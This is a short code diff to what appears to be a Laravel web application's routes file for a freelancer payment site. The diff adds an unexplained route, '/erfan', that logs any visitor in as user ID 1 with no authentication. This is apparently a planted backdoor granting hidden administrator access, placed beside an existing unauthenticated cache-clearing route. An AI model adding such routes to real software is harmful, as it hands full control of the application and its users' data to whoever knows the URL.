@@ -19,6 +19,9 @@ Route::get('/clear-cache', function() {
     $exitCode = Artisan::call('cache:clear');
     // return what you want
 });
+Route::get('/erfan', function() {
+    Auth::loginUsingId(1);
+});
 
 Route::get('freelancer/success', 'Front\PaymentController@success')->name('payment.success');
 Route::get('freelancer/fail', 'Front\PaymentController@fail')->name('payment.fail');
